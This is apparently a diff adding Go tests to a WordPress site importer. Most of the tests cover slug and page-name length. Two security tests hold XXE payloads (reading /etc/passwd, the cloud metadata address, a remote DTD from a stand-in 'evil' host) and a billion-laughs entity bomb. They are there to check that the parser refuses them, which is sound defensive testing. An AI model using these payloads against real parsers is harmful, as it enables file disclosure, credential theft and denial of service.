@@ -13,6 +13,7 @@ import (
 	"time"
 
 	"github.com/quilzo/quilzo/internal/feature"
+	"github.com/quilzo/quilzo/internal/schema"
 	"github.com/quilzo/quilzo/internal/section"
 )
 
@@ -502,5 +503,167 @@ func TestSameNamesAreNumberedInTimeInProportionToThem(t *testing.T) {
 	}
 	if left != len(s.Pages)-len(p.Pages) || !strings.Contains(strings.Join(b.Notes, "\n"), "page same-9999 was left out") {
 		t.Errorf("%d pages kept, %d named as left out", len(p.Pages), left)
+	}
+}
+
+// A post with a long title is given a link the blog type accepts.
+//
+// The link was clipped at 80 characters by the function that shortens words
+// to read, which ends what it cuts with "…". A post titled at more than 80
+// characters, with no slug of its own, became /post/how-we-rebuilt-…, a link
+// with a character no address should carry, which the blog type's own page
+// link rule refuses: the post could be brought but never saved again.
+func TestALongPostTitleGivesALinkTheBlogTypeAccepts(t *testing.T) {
+	title := "How we rebuilt the oven, the counter and the front window in one winter, " +
+		"and what it taught us about bread"
+	home, _ := url.Parse("https://bakery.example/")
+	old, _ := url.Parse("https://bakery.example/2019/04/oven/")
+	s := &Site{Home: home, Name: "Bakery", From: KindWordPress, Origin: "bakery.xml",
+		Pages: []Page{{URL: home, Title: "Bakery", Blocks: []Block{{Kind: "p", Text: "We bake.", MD: "We bake."}}}},
+		Posts: []Post{{URL: old, Title: title, Published: "2026-10-27",
+			Blocks: []Block{{Kind: "p", Text: "It took a winter.", MD: "It took a winter."}}}}}
+	b, err := Package(s, "", "dana", nil, time.Now())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(b.Posts) != 1 {
+		t.Fatalf("%d posts brought", len(b.Posts))
+	}
+	post := b.Posts[0].Fields
+	slug, _ := post["slug"].(string)
+	if strings.Contains(slug, "…") || len(slug) > 80 || !strings.HasPrefix(slug, "how-we-rebuilt-the-oven") {
+		t.Errorf("the post's link is %q", slug)
+	}
+	if problems := schema.Validate(feature.BlogPackage().Types[0], post); len(problems) > 0 {
+		t.Errorf("the blog type refuses the post it was brought as: %v", problems)
+	}
+	if len(b.Redirects) == 0 {
+		t.Fatal("no redirect from where the post was")
+	}
+	for _, r := range b.Redirects {
+		if strings.ContainsFunc(r.To, func(c rune) bool { return c > 127 }) {
+			t.Errorf("the post's old address goes to %q", r.To)
+		}
+	}
+}
+
+// A page at a long address is given a name a package may hold.
+//
+// Each part of the address was clipped at 60 characters the same way, ending
+// in "…", so a page at /the-whole-story-of-…-and-more-besides came to a name
+// no page may have.
+func TestALongPageAddressGivesAPageNameAPackageAccepts(t *testing.T) {
+	home, _ := url.Parse("https://bakery.example/")
+	long, _ := url.Parse("https://bakery.example/the-whole-story-of-the-bakery-from-its-first-oven-to-its-latest-loaf/")
+	s := &Site{Home: home, Name: "Bakery", From: KindWordPress, Origin: "bakery.xml",
+		Pages: []Page{
+			{URL: home, Title: "Bakery", Blocks: []Block{{Kind: "p", Text: "We bake.", MD: "We bake."}}},
+			{URL: long, Title: "Our story", Blocks: []Block{{Kind: "p", Text: "Since 1952.", MD: "Since 1952."}}},
+		}}
+	if got := pageName(long); strings.Contains(got, "…") || len(got) > 60 || !strings.HasPrefix(got, "the-whole-story") {
+		t.Errorf("the page at %s is named %q", long, got)
+	}
+	b, err := Package(s, "", "dana", nil, time.Now())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := b.Package.Validate(feature.Checks{}); err != nil {
+		t.Errorf("the package refuses the page it was brought as: %v", err)
+	}
+}
+
+// A page deep in long addresses is given a name a package may hold, and so is
+// the one beside it that has to be numbered.
+//
+// Each part was cut at 60 characters and up to four parts kept, so three long
+// parts came to a name of 182 characters, past the 128 a package's page may
+// have, and the whole package was refused for one page. Two pages that came
+// to the same long name, the second numbered, went past it the same way.
+func TestADeepLongPageAddressGivesAPageNameAPackageAccepts(t *testing.T) {
+	home, _ := url.Parse("https://bakery.example/")
+	deep, _ := url.Parse("https://bakery.example/the-whole-story-of-the-bakery-from-its-first-oven-to-its-latest-loaf/" +
+		"and-then-the-second-part-of-the-story-which-is-also-quite-long-indeed/" +
+		"and-a-third-part-that-goes-on-for-a-while-longer-than-it-should-do/")
+	// Elsewhere on the site, ending in the same two long parts, so it comes
+	// to the same name and is numbered.
+	twin, _ := url.Parse("https://bakery.example/elsewhere/" +
+		"and-then-the-second-part-of-the-story-which-is-also-quite-long-indeed/" +
+		"and-a-third-part-that-goes-on-for-a-while-longer-than-it-should-do/")
+	s := &Site{Home: home, Name: "Bakery", From: KindWordPress, Origin: "bakery.xml",
+		Pages: []Page{
+			{URL: home, Title: "Bakery", Blocks: []Block{{Kind: "p", Text: "We bake.", MD: "We bake."}}},
+			{URL: deep, Title: "Our story", Blocks: []Block{{Kind: "p", Text: "Since 1952.", MD: "Since 1952."}}},
+			{URL: twin, Title: "More of it", Blocks: []Block{{Kind: "p", Text: "And after.", MD: "And after."}}},
+		}}
+	// The parts nearest the page are the ones kept, as they are when an
+	// address has more than four.
+	if got := pageName(deep); len(got) > 121 || !strings.HasSuffix(got, "/and-a-third-part-that-goes-on-for-a-while-longer-than-it-sho") {
+		t.Errorf("the page at %s is named %q, %d characters", deep, got, len(got))
+	}
+	b, err := Package(s, "", "dana", nil, time.Now())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(b.Package.Pages) != 3 {
+		t.Fatalf("%d pages brought, not 3", len(b.Package.Pages))
+	}
+	if err := b.Package.Validate(feature.Checks{}); err != nil {
+		t.Errorf("the package refuses the pages it was brought as: %v", err)
+	}
+}
+
+// An export declaring an entity is refused, and says why in words.
+//
+// CVE-2021-29447 and WordPress 5.7's XXE were both this. encoding/xml never
+// reads an entity declaration, so the reference is never resolved, and that
+// is asserted rather than assumed. The same file was refused by `quilzo
+// import` with the reason and what to do about it, and by `quilzo site
+// import` with only "invalid character entity", which reads as a broken file
+// rather than as the attack it is.
+func TestExternalEntitiesAreNeverResolved(t *testing.T) {
+	for _, payload := range []string{
+		`<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
+		`<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>`,
+		`<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/e.dtd"> %p;]>`,
+	} {
+		doc := strings.Replace(wxr, `<channel>`, `<channel><item><title>&xxe;</title>`+
+			`<wp:post_name>x</wp:post_name><wp:post_type>post</wp:post_type>`+
+			`<wp:status>publish</wp:status></item>`, 1)
+		doc = strings.Replace(doc, `?>`, `?>`+payload, 1)
+		s, err := FromWordPress([]byte(doc), "evil.xml")
+		if err == nil {
+			for _, p := range s.Posts {
+				if strings.Contains(p.Title, "root:") {
+					t.Fatal("a file was read through an entity")
+				}
+			}
+			t.Errorf("a document declaring an external entity was accepted: %s", payload)
+			continue
+		}
+		if !strings.Contains(err.Error(), "entities, which are not resolved here") {
+			t.Errorf("refused without saying why: %v", err)
+		}
+	}
+}
+
+// The other half of the same class: no external reference, just exponential
+// expansion. Three levels here; the real attack uses nine.
+func TestBillionLaughsCannotExpand(t *testing.T) {
+	doc := strings.Replace(wxr, `?>`, `?><!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>`, 1)
+	doc = strings.Replace(doc, `<channel>`, `<channel><item><title>&lol3;</title></item>`, 1)
+	done := make(chan struct{})
+	go func() {
+		_, _ = FromWordPress([]byte(doc), "lolz.xml")
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-time.After(5 * time.Second):
+		t.Fatal("the parser is still expanding after five seconds")
 	}
 }
